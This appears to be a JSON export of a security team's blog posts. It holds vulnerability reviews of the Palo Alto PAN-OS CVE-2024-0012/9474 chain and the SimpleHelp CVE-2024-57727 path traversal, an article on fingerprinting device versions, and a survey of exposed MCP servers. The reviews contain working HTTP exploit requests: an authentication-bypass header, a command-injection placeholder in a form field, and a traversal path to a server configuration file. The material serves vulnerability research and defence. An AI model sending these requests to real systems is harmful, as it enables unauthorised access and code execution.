    "content": "This article was first published on our team’s. Click here to read the Chinese version. https://mp.weixin.qq.com/s/6kuuU0WcrWqI-hw2PSoYmAIntroductionThis paper is a vulnerability analysis review. 2024 saw two serious security vulnerabilities in Palo Alto Networks’ firewall and SSL VPN products: CVE-2024-0012 and CVE-2024-9474. these two vulnerabilities (the authentication bypass vulnerability and the elevation of privilege vulnerability) can be exploited in combination to enable authentication-less remote code execution without authentication. watchtowr provides an excellent analysis of the process from identity bypass to command execution. However, the article fails to go deep enough when the analysis involves the panCreateRemoteAppwebSession function, which leaves one wanting more. Since the author could not fully understand the process of command execution when reproducing the vulnerability, he decided to do it himself instead of asking for help. In this article will watchtowr analysis based on a brief review of the identity bypass problem, and in-depth analysis of the specific implementation of the command execution, combined with the newly discovered authentication bypass vulnerability CVE-2025-0108, to explore the possibility of combining the use of CVE-2025-0108 and CVE-2024-9474.Vulnerability AnalysisCVE-2024-0012: Authentication BypassBased on watchtowr’s analysis, we know that prior to the vulnerability fix, Palo Alto had a security risk when processing requests ending in .js.map: these requests were assumed to be authenticated without setting the X-pan-AuthCheck header. The subsequent fix was to add the X-pan-AuthCheck authentication requirement to proxy_default.conf.All requests via Nginx are forwarded to a locally running Apache server (which listens on port 28250) for subsequent processing.In php.ini you can see that the auto_prepend_file directive is configured, which automatically loads the uiEnvSetup.php file for environment variable checking before executing any PHP scripts.In uiEnvSetup.php, the system decides whether to authenticate the current request by checking three conditions:  Request header check: if the value of request header HTTP_X_PAN_AUTHCHECK is not 'off', then authentication is required.  Script path check: if the current script path is not /CA/ocsp or /php/login.php, authentication is required.  Local request check: if the request is not from the local host ( 127.0.0.1 ), authentication is required.When all the above conditions are met, the system performs authentication. If any of the conditions are not met, the authentication check is skipped.Therefore, by adding X-PAN-AUTHCHECK: off to the HTTP request header, an attacker can bypass the authentication check and illegally access PHP resources.GET /php/ztp_gate.php/.js.map  HTTP/1.1Host: 192.168.32.251X-PAN-AUTHCHECK: offAfter bypassing the authentication check, the attacker can access critical PHP files. Within these files, the watchtowr team discovered an elevation of privilege vulnerability in the GlobalProtect client, which exists in the panCreateRemoteAppwebSession function. This vulnerability allows an attacker to execute arbitrary commands on the target system, completing the full attack chain from authentication bypass to remote code execution.CVE-2024-9474: Elevation of PrivilegeAccording to the payload provided by watchtowr, the exploit process for CVE-2024-9474 is very straightforward: an attacker sends a POST request to createRemoteAppwebSession.php, injects a payload into the user parameter, and then triggers a sessionid to execute the payload. After getting the session id, the payload is triggered.POST /php/utils/createRemoteAppwebSession.php/aaaa.js.map HTTP/1.1Host: X-PAN-AUTHCHECK: offContent-Type: application/x-www-form-urlencodedContent-Length: 99user=`payload`&amp;userRole=superuser&amp;remoteHost=&amp;vsys=vsys1In watchtowr’s analysis, the analysis stops abruptly when it comes to the panCreateRemoteAppwebSession function, and does not go any further in explaining the specific trigger point of CVE-2024-9474. Attackerkb’s description of the vulnerability mentions the following:According to Attackerkb’s analysis, when the AuditLog.write function is called, the tampered username value is passed to the pexecute call, which leads to command injection.However, when analyzing the process by using pspy, it was found that the actual command executed was not from AuditLog.write, but rather the payload was executed in a sub-process (ppid) of configd. This clearly indicates that the trigger for CVE-2024-9474 is not here, but rather exists in the process associated with configd.By executing the command find /usr/local/ -type f ! -path “/cgroup/ “ ! -path “/sys/ “ ! -path “/tmp/ “ ! -path “/cache/ “ ! -path “/logs/ “ -exec grep -l “export panusername=” {} \\; Searching for the file containing the command execution feature revealed that the feature exists in the pan_op_ctxt_get_env function in /usr/local/lib64/libpanmp_mp.so.1.0.[root@PA-VM /]# find /usr/local/ -type f ! -path \"*/cgroup/*\" ! -path \"*/sys/*\" ! -path \"*/tmp/*\" ! -path \"*/cache/*\" ! -path \"*/logs/*\" -exec grep -l \"export panusername=\" {} \\;/usr/local/lib64/libpanmp_mp.so.1.0[root@PA-VM /]# The pan_mgmtop_handle_script_or_exec function first gets the username from the session via pan_cfg_get_username_by_cookie and saves the payload to the local_88 buffer. It then calls the pan_op_ctxt_get_env function to set up the command execution environment, including configuring environment variables and permissions. After setting up the environment, the system splices the user-supplied command or script parameters directly into the environment command string. Finally, this complete command string is passed to the pan_get_system_cmd_output function for execution and the result is returned.\t\t// 获取用户信息    pan_cfg_get_username_by_cookie(param_10,*(byte **)(lVar8 + 0x58),local_88,0x40);    iVar2 = pan_cfg_get_adminrole_by_cookie(param_10,*(char **)(lVar8 + 0x58));        // 处理异步模式    if (param_17 != 0) {      lVar8 = xmlHasProp(*(undefined8 *)(*(long *)(param_11 + 8) + 0x10),\"async-mode\");      if (lVar8 != 0) {        lVar8 = xmlGetProp(*(undefined8 *)(*(long *)(param_11 + 8) + 0x10),\"jobid\");        if (lVar8 != 0) {          // 如果有jobid，将其导出到环境变量          pan_string_buffer_appendf(lVar5,\"export jobid=\\\"%s\\\";\",lVar8);          (*_xmlFree)(lVar8);        }      }    }        uVar10 = (ulong)param_17;    // 获取命令执行环境    uVar7 = pan_op_ctxt_get_env(param_12,lVar5,local_88,iVar2,param_17);    pcVar9 =     \"&lt;response status=\\\"error\\\"&gt;&lt;msg&gt;&lt;line&gt;Unable to construct operational command&lt;/line&gt;&lt;/msg&gt;&lt;/response&gt;\";    uVar6 = extraout_XMM0_Qa_03;        if (-1 &lt; (int)uVar7) {      // 添加用户提供的命令/脚本到缓冲区      pan_string_buffer_append(lVar5,param_13);            iVar2 = pan_get_system_cmd_output(*(char **)(lVar5 + 8),lVar4,&amp;local_8a);pan_get_system_cmd_output triggers the payload by calling pan_get_system_cmd_output_impl and then using execv within the pan_popen_no_stderr method in linpancommon_map.so./** * pan_popen_no_stderr - 类似popen函数，执行命令但不处理标准错误输出 * 创建一个管道并执行指定的命令，允许调用进程读取命令的标准输出 * @param_1: 要执行的命令路径 * @param_2: 命令的参数数组 * @return: 返回指向管道读取端的FILE指针，失败返回NULL */FILE * pan_popen_no_stderr(char *param_1,char **param_2){  int iVar1;               // 存储函数返回值  __pid_t _Var2;           // 存储子进程PID  FILE *pFVar3;            // 用于管理子进程的文件结构  long in_FS_OFFSET;       // 栈保护值  FILE *local_30;          // 指向管道读取端的FILE指针  int local_28;            // 管道的读取端文件描述符  int local_24;            // 管道的写入端文件描述符  long local_20;           // 栈检查变量    // 栈保护初始化  local_20 = *(long *)(in_FS_OFFSET + 0x28);  // 分配一个FILE结构体用于管理子进程  pFVar3 = (FILE *)malloc(0x18);  local_30 = pFVar3;  if (pFVar3 != (FILE *)0x0) {    // 创建管道    iVar1 = pipe(&amp;local_28);    if (iVar1 == 0) {      // 将管道读取端转换为FILE流      local_30 = fdopen(local_28,\"r\");      if (local_30 == (FILE *)0x0) {        // 如果转换失败，关闭管道的两端        close(local_28);        close(local_24);      }      else {        // 锁定互斥锁避免竞态条件        pthread_mutex_lock((pthread_mutex_t *)&amp;DAT_009ea140);        // 创建子进程        _Var2 = vfork();        if (_Var2 == 0) {          // 这是子进程代码          // 关闭管道读取端          close(local_28);          pFVar3 = DAT_009ea120;          if (local_24 != 1) {            // 将管道写入端复制到标准输出            dup2(local_24,1);            close(local_24);            pFVar3 = DAT_009ea120;          }          // 关闭所有打开的文件描述符          for (; pFVar3 != (FILE *)0x0; pFVar3 = *(FILE **)pFVar3) {            iVar1 = fileno((FILE *)pFVar3-&gt;_IO_read_ptr);            close(iVar1);          }          // 执行指定的命令 - 这里是执行命令的关键部分          execv(param_1,param_2);          // 如果execv返回，表示出错          _exit(0x7f);        }        // 父进程继续执行        pthread_mutex_unlock((pthread_mutex_t *)&amp;DAT_009ea140);        // 关闭管道写入端        close(local_24);        if (0 &lt; _Var2) {          // 保存子进程的信息          *(__pid_t *)&amp;pFVar3-&gt;_IO_read_end = _Var2;          pFVar3-&gt;_IO_read_ptr = (char *)local_30;          pthread_mutex_lock((pthread_mutex_t *)&amp;DAT_009ea140);          // 将进程添加到进程列表中          *(FILE **)pFVar3 = DAT_009ea120;          DAT_009ea120 = pFVar3;          pthread_mutex_unlock((pthread_mutex_t *)&amp;DAT_009ea140);          goto LAB_005c4430;        }        fclose(local_30);      }    }    free(pFVar3);    local_30 = (FILE *)0x0;  }LAB_005c4430:  // 栈保护检查  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {    __stack_chk_fail();  }  return local_30;}With the payload’s execution point in mind, let’s go back and look at how the exploit was triggered. We ended up locating the PA’s show chassis-ready command (and some other commands as well), which is used to display the hardware status of the device, including whether the dataplane is ready to handle traffic and whether the running policy is loaded. When this command is executedThe Palo Alto Firewall checks the status of the dataplane configuration by running /usr/local/bin/sdb -n cfgpush.s1.comm.config-exist in parallel through multiple sub-processes and converts the results to yes or no output.Subsequently in the PHP code, we found the getDataPlaneStatus method in the htdocs/php/include/Util.php file, which is called on the system by getVariables in htdocs/php/include/ContextVariables.php The method is called by getVariables.php in the system.The runOpCommand method is the core function used to execute operation commands in the Palo Alto Networks firewall management interface and is one of the key interfaces for communicating with the PAN-OS XML API. The method takes two parameters: an XML format string containing the operation command to be executed ($operation) and optional additional attribute parameters ($attributes).During the request construction process, the system calls XmlRequest::op($operation, $attributes) to create a complete XML request. This request is formatted into a specific XML structure and session cookies and other necessary request attributes are added.When communicating with the Management Server, the request is sent to the PAN-OS Management Server via Backend::getArray(). The underlying implementation uses the MSConnection class to communicate with the local management server over a TCP socket (default port 10000.) MSConnection is responsible for establishing the connection, sending the request header and payload, and receiving and processing the response.Therefore, we can quickly try to trigger the vulnerability by locating the call to ContextVariables::getVariables().For example, the following request could trigger this vulnerability:GET /php/device/export.file.php?type=techsupport HTTP/1.1Host: 192.168.32.251cookie: PHPSESSID=9f56ts27jh56hh8pgrl3nhkmkq;Similarly, the principle of triggering the vulnerability in index.php is the same - the Page::printDynamicContext() method in index.php calls ContextVariables::getVariables(). We can find more entry points that could trigger the vulnerability by looking for other locations where Page::printDynamicContext() is called.For example, the following request could trigger the vulnerability:GET /unauth/php/change_password.php HTTP/1.1Host: 192.168.32.251cookie: PHPSESSID=9f56ts27jh56hh8pgrl3nhkmkq;Since configd is running with root privileges, when a privilege bypass is performed via low-privilege nginx, the effect of elevation of privilege is achieved after a payload is triggered in configd.Thought: exploit in combination with CVE-2025-0108?After CVE-2025-0108 was published, I spent a long time thinking whether it could be exploited in combination with CVE-2024-9474. However, this attempt naturally ended in failure.The previous analysis did not describe panCreateRemoteAppwebSession too much, in fact, this function is mainly used to create a session, which is also the key to be able to write payloads.The definition of panCreateRemoteAppwebSession cannot be found in the PHP source code, the function is actually defined in the panhttpdmodule.so module.The function first gets the remote host address (REMOTE_HOST) from which the request was made using the pan_php_SERVER_get_str function, and then checks to see if it is a trusted local loopback address. It verifies that the remote address matches any of the following local loopbacks in turn: “127.0.0.1” (IPv4 local loopback), “::1” (IPv6 short form), or “0:0:0:0:0:0:0:1” (IPv6 full form). If the remote address does not match any of these local loopback addresses, the program performs additional validation logic.Due to space constraints and the fact that there are many excellent articles analyzing CVE-2025-0108, I will not go into the details here. I won’t go into too much detail here. X-Forwarded-For is set in proxy_default.conf.When a client request arrives at Nginx, Nginx checks to see if the request contains the X-Forwarded-For header. If the request already contains this header, $proxy_add_x_forwarded_for appends the client’s actual IP address to the existing value in the format: original X-Forwarded-For value, $remote_addr. If the request does not contain the X-Forwarded-For header, the $proxy_add_x_forwarded_for value is appended to the existing value. x_forwarded_for value will be directly equal to $remote_addr (the client’s IP address).However, in a real-world environment, we found that the checking mechanism in the panCreateRemoteAppwebSession function is strictly dependent on the integrity of the X-Forwarded-For header. Even if we were able to achieve authentication bypass via CVE-2025-0108, due to Nginx’s strict header handling and forwarding mechanism, it is difficult to directly manipulate the internal service to think that the request is coming from 127.0.0.1. This makes it still difficult to directly combine the two vulnerabilities for exploitation.However, in a bulletin about CVE-2025-0108, Palo Alto noted that “Palo Alto Networks discovered that attackers are attempting to chain CVE-2025-0108, CVE-2024-9474, and CVE-2025-0111, targeting unpatched and unprotected PAN-OS Web management interface.”There is also a never-before-seen CVE-2025-0111 certified file-reading vulnerability, a file-reading vulnerability that may be the final key to unlocking Pandora’s Box.SummaryThis article provides an in-depth analysis of several important security vulnerabilities in Palo Alto Networks firewall and SSL VPN products. It first explored the CVE-2024-0012 authentication bypass vulnerability, which exists in the authentication mechanism that handles requests ending in .js.map. The CVE-2024-9474 elevation of privilege vulnerability is then analyzed in detail, especially the implementation details of the panCreateRemoteAppwebSession function involved and the vulnerability triggering mechanism.It was found that the exploit chain can be triggered by commands such as “show chassis-ready”. This process involves the interaction of multiple components, including Nginx, Apache, and the internal management server. The article also explores specific trigger points for the vulnerability, including multiple entry points such as export.file.php and change_password.php.When attempting to combine the newly discovered CVE-2025-0108 with CVE-2024-9474, it was found to be difficult due to Nginx’s strict header handling mechanism. However, Palo Alto’s latest security bulletin mentions that attackers are attempting to chain CVE-2025-0108, CVE-2024-9474, and CVE-2025-0111, which hints at the possibility of a more complex exploit chain.Refer to  https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/  http://php.net/auto-prepend-file  https://attackerkb.com/topics/n8GmwEZA1k/cve-2024-9474  https://security.paloaltonetworks.com/CVE-2025-0111  https://security.paloaltonetworks.com/CVE-2025-0108  https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E5%9C%A8%E6%95%85%E4%BA%8B%E4%B9%8B%E5%89%8D  https://slcyber.io/blog/nginx-apache-path-confusion-to-auth-bypass-in-pan-os/  https://nginx.org/en/docs/http/ngx_http_proxy_module.html"
  },
  
  {
    "title": "Practicing Version Recognition Technology in Critical Devices",
    "url": "/posts/version/",
    "categories": "Fortigate",
    "tags": "Fortigate",
    "date": "2025-04-20 12:13:00 +0800",
    





    
    "snippet": "This article was first published on our team’s. Click here to read the Chinese version. https://mp.weixin.qq.com/s/k74R7FcWcjIBqLJa0eTwRgIntroductionThose who pay attention to security consulting m...",
    "content": "This article was first published on our team’s. Click here to read the Chinese version. https://mp.weixin.qq.com/s/k74R7FcWcjIBqLJa0eTwRgIntroductionThose who pay attention to security consulting may have noticed that when a certain device has a vulnerability, we often see reports such as “a certain device has been hacked” or “a certain vulnerability affects a large number of devices” and so on.However, we know that the scope of the vulnerability is actually closely related to the version of the device. So how do these reports quickly determine the scope of the vulnerability? Especially for those devices that do not clearly show version information, how to quickly determine its version has become a key issue.Based on this background, this paper will delve into the key technical issue of version identification. By drawing on and summarizing the practical experience of industry experts, we will focus on the version identification technology of a number of mainstream devices, including Citrix, CiscoRV and Flytower. In this paper, we focus on analyzing those key devices that do not have explicit version information, and explore how to accurately determine their running versions through indirect methods, so as to provide an important reference for the assessment of the scope of vulnerability impact.Technical Practice AnalysisIn this paper, the following three technical approaches are mainly used in device version identification:  Based on HTTP response header analysis: analyze the Last-Modified header information returned by the device and compare it with the release time of the known version to determine the version.  Configuration file parsing: accessing and analyzing key configuration files of the device to directly obtain version information.  Static Resource Characterization: Collect and compare the static resource hash value and path characteristics of the device to determine the version.Each of these methods has its own advantages and disadvantages: the timestamp-based method may be biased due to file modifications, and configuration file parsing, although highly accurate, requires higher access rights. Therefore, it is usually necessary to combine multiple methods to improve the accuracy of version identification in practical applications.Device Example StudyCitrix Device Version IdentificationCitrix ADC and Citrix Gateway are important networking products from Citrix that are widely used for internal and external application access in organizations. In the current Internet environment, external attackers have become a common security threat by exploiting vulnerabilities in targeted systems and products.Since Citrix ADC and Citrix Gateway products do not display clear version identification externally, this poses a challenge for testers to perform version fingerprinting. However, we can obtain the version information of these two products through the following technical means:First, the last modification timestamp in the system file attributes can be utilized for version determination. Since there are intervals between the release of different versions of Citrix products, the file modification time can reflect the approximate version range of the products.Second, a version feature library can be built by collecting the static file hash values of each known version of Citrix products. When testing, we only need to obtain the file hash value of the target system and compare it with the feature library to deduce the specific version number.Finally, in Citrix Gateway products, certain configuration files will write their own version information into them, and we can determine the version information by parsing certain key configuration files. For example, by accessing a specific configuration page or API interface, the version identification can be extracted from the response. This method requires higher privileges, but can get the most accurate version information.We first set up the Citrix environment locally by entering the system and executing the command grep -R “13.0.47.24” /var/netscaler/ -name “*.xml”. With this command, we found the current product version information in the /vpn/pluginlist.xml file./vpn/pluginlist.xml is an XML-formatted configuration file in the Citrix Gateway product that contains information about the list of plugins enabled by Gateway.When Citrix Gateway is deployed as a VPN gateway, it needs to load various plug-in modules to handle functions such as VPN connectivity, authentication, and policy control. Configuration information such as the enabled status and load paths of these plug-ins are stored in the pluginlist.xml file, so we can access this file to obtain version information.When analyzing the HTTP responses of Citrix ADC and Gateway, we found that in addition to the above interfaces, when requesting the specific URI “/vpn/index.html”, the HTML response body contains a string value similar to an MD5 hash, which is appended to the URL of the page resource in the form of the parameter “?v=”.To explore the significance of this version hash, we collected and extracted a large number of scan data reports from Citrix products, and found that there are nearly a hundred unique version hashes. In order to verify that these hashes can be mapped to specific product versions, we built our own test environment for Citrix ADC. After simulated access and analysis of the page response, we found that the version hash is a randomly generated identifier rather than a preset static token.Based on this, we can extract the version hash information from a specific interface, and accurately locate the specific version of the product by parsing the hash value of each historical version.When Citrix releases products such as ADC and Gateway, it records the last modification time of the file in the file attributes. System components such as executables, configuration files, static resources, etc. will contain Last Modified timestamps. When a user accesses these system files via an HTTP/HTTPS request, the server returns the Last-Modified field in the response header, and the value of this field is the last modification time in the file attribute.For example, if you access the Citrix ADC administration interface/logon/LogonPoint/pluginFiles.json page, the response headers will contain: Last-Modified: Tue, 05 Apr 2022 10:11:21 GMT This timestamp reflects the last modification time of the pluginFiles.json file. This timestamp reflects the last modification time of the pluginFiles.json file. Similarly, we can request other system files to get their modification times.By writing a script to batch fetch the Last-Modified times of key system files, we can get a set of time datasets. By comparing this data with the release times of each historical Citrix version, we can match the closest version number.Although there are limitations in this method - multiple modifications of files may lead to deviations in the time information - it still provides an important reference for Citrix product version identification as a passive way of collecting fingerprint information.CiscoRV Device Version IdentificationThe Cisco RV34X series routers are high-performance, secure network devices designed for small businesses. For version identification, we first examined the device’s Web interface code, but were unable to find an obvious version identifier.Last-Modified is a key field in the HTTP response header that identifies when a resource was last modified. By analyzing the RV34X series firmware, we found that the last-modified time of the three CGI files exactly matches the release time of the firmware. So, can we determine the specific version of the target device by directly accessing these CGI files and obtaining the Last-Modified value?In order to verify the correlation between Last-Modified headers and firmware versions, we tested the Last-Modified headers on the /cgi-bin/blockpage.cgi files of multiple devices and checked them against known firmware versions. The test results confirm that the headers partially reflect the device’s firmware version. Based on this finding, we created a version mapping table that corresponds Last-Modified dates to specific firmware versions, as shown below:CISCO_RV34X_VERSION_MAP = {  \"2022-10-17\": \"1.0.03.29\",  \"2022-06-14\": \"1.0.03.28\",  \"2022-03-08\": \"1.0.03.27\",  \"2022-01-06\": \"1.0.03.26\",  // 省略  } Using this mapping relationship, we are able to quickly determine the corresponding firmware version from the Last-Modified header information returned by a remote device, thus realizing remote version identification.Fortinet Version RecognitionThe Fetta (Fortinet) Firewall is a high-performance, multi-functional network security product from Fortinet that uses a unified threat management (UTM) solution accelerated by a dedicated security processing chip.We have collected as much of Fita’s firmware as possible to build a complete repository.In newer versions of the Feta Firewall, the page’s static resource loading path exhibits unique characteristics. Specifically, the path contains a random hash value. The existence of this hash value makes the static resource loading path of the page with high uniqueness. By analyzing the code of the page, locating the loading path of the static resources, and then extracting the hash value, it can be used as an important basis for judging the newer versions.For older versions of Feta Firewall, the paths for loading static resources on the page are significantly different from the newer versions. The paths of these earlier versions do not contain random hash values, but rather a simple string of numbers. Although this string of numbers is less complex to characterize than the hash value, it can still be used as a reliable version identifier. By comparing the path characteristics on the page with known version information, we can accurately determine if the firewall is an earlier version.Earlier versions of the Feta Firewall are unique in their page characteristics. Its static resource links do not contain obvious path features, but instead use a string of numbers as parameters. This type of parameter passing is more common in earlier versions (3.x). By analyzing the numeric parameters of the static resource links in the page, we can determine whether the firewall belongs to one of these earlier versions.Through these studies we found that there are significant differences in page characteristics, static resource loading methods, and parameter passing between different versions of the Feta Firewall. These differences not only provide us with reliable version identification markers, but also reflect the technological evolution of Feta products at different stages of development. Combining these features, we can build a relatively complete version identification methodology, which provides important support for device security assessment.SummarizationIn this paper, we explored the version identification technology practices of three mainstream devices (Citrix, CiscoRV and Fetta). By analyzing information from multiple dimensions such as HTTP response headers, static resource features, page hash values, etc., we successfully constructed a set of reliable version identification methods. These methods not only provide important support for vulnerability impact scope assessment, but also provide valuable technical references for the research field of device security.References  https://cybernews.com/security/fortinet-hackers-maintaining-access-despite-patches/  https://www.fortinet.com/blog/psirt-blogs/analysis-of-threat-actor-activity"
  },
  
  {
    "title": "Security Challenges in the Popularization of MCP Services",
    "url": "/posts/mcp/",
    "categories": "AI, MCP",
    "tags": "MCP",
    "date": "2025-04-03 12:13:00 +0800",
    





    
    "snippet": "This article was first published on our team’s. Click here to read the Chinese version. https://mp.weixin.qq.com/s/M2M8XsEFmT7rrs1M5gJ9hw1. Introduction.MCP (Model Context Protocol) is an open prot...",
    "content": "This article was first published on our team’s. Click here to read the Chinese version. https://mp.weixin.qq.com/s/M2M8XsEFmT7rrs1M5gJ9hw1. Introduction.MCP (Model Context Protocol) is an open protocol launched and open-sourced by Anthropic in November 2024, aiming to realize a seamless conversation between AI and external tools. With the popularity of MCP, its applications have been expanding from browser operations to database querying, from weather information acquisition to complex system integration, which greatly enhances the practical value of AI. However, against the background of this rapid development, some potential security issues gradually emerge.2 Research backgroundThe core value of MCP, as a protocol framework specialized in realizing the interaction of large-scale language models with external tools and data sources, is to securely realize the invocation of AI models to external tools, the access to databases, and the execution of specific tasks. However, this powerful extension of functionality comes with corresponding security risks.MCP provides two main communication modes that allow AI models to flexibly interact with external tools:The first is the local communication mode, which is like two programs “talking” on the same computer, passing information through standard inputs and outputs. For example, if you run an AI application locally, it can directly call a tool or program on your computer, which is fast and secure.Look at a practical example: with the MCP protocol, we can make it super easy for AI to use various tools. For example, we can get an nmap service based on MCP and set up the communication mechanism in the local environment. After setting up the communication mechanism, the locally running AI can directly call the nmap tool and easily complete the network port scanning.The other is the remote communication mode, which is more like the AI “chatting” with the remote tool through the network. It uses SSE (Server-Sent Events) + HTTP protocol technology, which allows the AI to receive data streams from remote servers in real time. This approach is particularly suitable for scenarios that require access to cloud resources or use in distributed systems.The existence of these two communication methods allows MCP to be better adapted to different usage scenarios.3 Research Methodology3.1 Feature ExtractionThe rapid emergence of MCP services provides us with rich samples for analysis. A variety of MCP service implementations exist on GitHub, and we focus on two categories: one is MCP servers implemented based on NodeJS (e.g., Supergateway), and the other is services implemented based on Python (e.g., MCP-proxy, Markitdown, etc.). Of course, there are other implementations, but this study will focus on these two categories.The response of a NodeJS-based implementation of the MCP service when accessed directly is as follows:HTTP/1.1 404 Not FoundX-Powered-By: ExpressContent-Security-Policy: default-src 'none'X-Content-Type-Options: nosniffContent-Type: text/html; charset=utf-8Content-Length: 139Date: Thu, 03 Apr 2025 08:51:33 GMTConnection: keep-aliveKeep-Alive: timeout=5&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;title&gt;Error&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;Cannot GET /&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;Based on this response, we can summarize the search syntax for a specific spatial mapping system (e.g., Censys):web.endpoints.http.status_code:404 and web.endpoints.http.body_size:139 and web.endpoints.http.body_hash_sha256 = “ 52c1e7a2c36be28c42455fe1572d7d7918c3180cad99a2b82daa2a38a7e7bb23” This search method is not 100% sure that the result is the MCP service, but it does help us to narrow down the search effectively.Similarly, the response of the MCP service developed based on Python is as followsHTTP/1.1 404 Not Founddate: Thu, 03 Apr 2025 09:03:06 GMTserver: uvicorncontent-length: 9content-type: text/plain; charset=utf-8Not Found                                                                                                                                                                                            Based on these characteristics, the following search syntax can be constructed:web.endpoints.http.status_code:404 and web.endpoints.http.body_size:9 and web.software.product = “uvicorn”Due to the short public availability of the MCP, we extracted nearly a week’s worth of assets from cyberspace search engines based on the above search syntax. Next, we performed a scan based on publicly available SSE paths (e.g., “/sse”, “/mcp”, or “/mcp-sse”, etc.).Then, we utilize MCP’s Python SDK https://github.com/modelcontextprotocol/python-sdk to implement a client to connect to the remote MCP service for a list of available tools.4 Research FindingsBased on the above methodology, we found unauthorized MCP services on the Internet, from which we extracted 4,327 methods available for AI calls.Through in-depth analysis, we found that the types of tools provided by these services cover a wide range of areas, from basic system operations to sensitive data access. We categorized these tools and the following table details the distribution of tool types:            Category      Name      Percentage                  calendarGmailTools      Calendar and mail related      19.9 %              tenantBrandTools      Tenant and brand management tools      17.4 %              searchRetrievalTools      Web Search and Retrieval      8.7 %              fileContentTools      Document and Content Processing      6.8%              systemTools      System and Command Line      6.8 %              memoryTools      Memory and Storage Related      6.2%              mathTools      Math and Computing      5.6%              taskManagementTools      Task and course management tools      5.6 %              healthUtilityTools      Health checks and utility tools      3.7 %              databaseTools      Databases and Queries      3.1%              securityTools      Security and Encryption      3.1%              otherTools      Other/Uncategorized Tools      1.9 %              webCrawlingTools      Web crawlers and content acquisition      1.9%              jiraTools      Jira-related      1.2%              financialTools      Finance and Account Management      1.2%              aiRecommendationTools      AI and Recommendations      1.2%              ticketApplicationTools      Work Order and Application Status Tools      1.2  %              notificationTools      Notification and Email Tools      0.6 %      Based on the analysis of the data in the table, we can draw the following key findings:  Top tool categories: Calendar and mail-related tools (19.9%) and tenant and brand management tools (17.4%) accounted for the largest share, totaling more than 37% of the tool distribution.  Information Processing Tools: Web Search and Retrieval (8.7%), File and Content Processing (6.8%), and System Tools (6.8%) formed the second tier, reflecting basic functionality needs.  Technical Support Tools: Memory and Storage (6.2%), Math Computing (5.6%), and Task Management (5.6%) form a medium-sized category of tools.  Specialized Domain Tools: Health Checks (3.7%), Databases (3.1%), and Security Tools (3.1%) are smaller but show the potential for MCPs to be used in specific domains.  Niche Application Tools: Tools in categories including web crawlers, Jira tools, and financial management all account for between 1-2%, indicating that MCP services are expanding into more specialized and niche areas.This distribution indicates that MCP services are currently focused on daily office and system management, but have begun to penetrate into various specialized fields. Therefore, the security of MCP becomes especially important. With the diversification of tool types and the expansion of application scenarios, unauthorized access to these services may lead to security risks such as leakage of sensitive information and misuse of system resources.For example, the execute_command tool can execute commands directly on the target system6 ConclusionBased on our findings, MCP services face serious security challenges along with their rapid popularity. The exposure of unauthorized MCP services to the Internet may not only lead to the leakage of sensitive information, but also be exploited by attackers to execute malicious commands, posing a significant threat to the information security of an organization. Therefore, we strongly recommend MCP service providers to strengthen access control, implement authentication, conduct regular security audits, and establish a comprehensive security response mechanism.In addition, MCP has recently (2025/03/26) released an important updateThis update contains two key changes:1. New Authentication FrameworkMCP introduces a comprehensive authentication framework based on OAuth 2.1, which significantly improves security. The new authentication mechanism provides standardized access control and supports a variety of authorization processes to effectively prevent unauthorized access and potential security threats.2. Transport Protocol ImprovementsThe protocol adopts a more flexible Streamable HTTP transport instead of the original HTTP+SSE method. This improvement not only enhances the scalability of the protocol, but also improves compatibility with modern web infrastructures, making it easier to deploy and maintain the service.These updates precisely address the security challenges we have previously identified, especially in the areas of access control and service authorization, which will significantly reduce the risk of unauthorized access.7. Reference  https://spec.modelcontextprotocol.io/specification/2025-03-26/changelog/  https://modelcontextprotocol.io/docs/concepts/architecture  https://github.com/supercorp-ai/supergateway/tree/main  https://github.com/sparfenyuk/mcp-proxy  https://github.com/microsoft/markitdown/blob/main/packages/markitdown-mcp/src/markitdown_mcp/main.py  https://github.com/chaitin/SafeLine/blob/695c438ec31f4170920c9903df447f4823dc958f/slmcp/server.py#L43  https://github.com/modelcontextprotocol/python-sdk"
  },
  
  {
    "title": "Vulnerability Review:CVE-2024-57727 Simple Help Unauthenticated Path Traversal Vulnerability",
    "url": "/posts/simple-help/",
    "categories": "vulnerability, SimpleHelp",
    "tags": "SimpleHelp",
    "date": "2025-01-17 12:13:00 +0800",
    





    
    "snippet": "OverviewSimpleHelp is a remote support software that allows technical support personnel to remotely view and control the customer’s computer to provide instant assistance. It supports multiple oper...",
    "content": "OverviewSimpleHelp is a remote support software that allows technical support personnel to remotely view and control the customer’s computer to provide instant assistance. It supports multiple operating systems and features unattended access, monitoring alerts, and management of remote computers. It also emphasizes data security with support for encryption and two-factor authentication, making it suitable for professional support teams of all sizes.Recently, Simple Help released a security advisory stating that SimpleHelp v5.5.7 and earlier versions have a path traversal vulnerability (CVE-2024-57727). This vulnerability allows unauthenticated remote attackers to download arbitrary files from the SimpleHelp host, including server configuration files containing various confidential information and hashed user passwords, through carefully crafted HTTP requests. The Horizon3 team has issued a vulnerability alert, but no further details have been disclosed. This article aims to conduct an in-depth analysis of CVE-2024-57727.            Attribute      Details                  CVE ID      CVE-2024-57727              Vulnerability Description      SimpleHelp remote support software versions v5.5.7 and earlier have multiple path traversal vulnerabilities, allowing unauthenticated remote attackers to download arbitrary files from the SimpleHelp host, including server configuration files containing various confidential information and hashed user passwords, through carefully crafted HTTP requests.              Affected Range      SimpleHelp v5.5.7 and earlier versions              Vulnerability Type      Path Traversal Vulnerability      Technical AnalysisThe exploitation difficulty of this vulnerability is not high. By examining the patch information, one can quickly pinpoint the issue to the respondToolboxResource method in the WebDownloadServer class. Comparing the code before and after the fix, it is evident that the new code has added logic to judge the path, from which it can be inferred that the root of the vulnerability lies here.public static File secure(File file) throws IOException, ForbiddenException {      if (isInsecure(file)) {         throw new ForbiddenException();      } else {         return file;      }   }   private void processOneHttpQuery() {    // ...    else if (firstLine.contains(\"toolbox-resource\")) {           this.respondToolboxResource(firstLine, \"application/octet-stream\");    }    // ...   }The respondToolboxResource method is called by the processOneHttpQuery function. When constructing the payload, the initial attempt is as follows:GET /toolbox-resource/randomStr/randomStr/../../configuration/serverconfig.xml HTTP/1.1Host: localhostitemID = “randomStr”resourceID = 